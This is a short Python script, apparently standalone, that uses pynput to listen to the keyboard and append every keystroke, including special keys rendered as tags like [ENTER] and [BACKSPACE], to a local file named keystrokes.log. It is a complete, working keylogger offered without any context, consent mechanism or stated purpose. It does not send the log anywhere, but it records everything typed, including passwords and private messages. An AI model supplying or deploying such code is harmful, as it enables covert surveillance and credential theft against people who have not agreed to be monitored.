from pynput.keyboard import Key, Listener

# Define the log file where keystrokes will be saved
log_file = "keystrokes.log"

def on_press(key):
    try:
        # Handle alphanumeric keys by converting them to string
        log_entry = str(key.char)
    except AttributeError:
        # Handle special keys by mapping them to readable strings
        special_keys = {
            Key.space: " ",
            Key.enter: "[ENTER]\n",
            Key.backspace: "[BACKSPACE]",
            Key.esc: "[ESC]"
        }
        # Default to the key name in uppercase if not in special_keys
        log_entry = special_keys.get(key, f"[{key.name.upper()}]")

    # Append the keystroke to the log file
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(log_entry)

# Start the keyboard listener and join the thread to keep it running
with Listener(on_press=on_press) as listener:
    listener.join()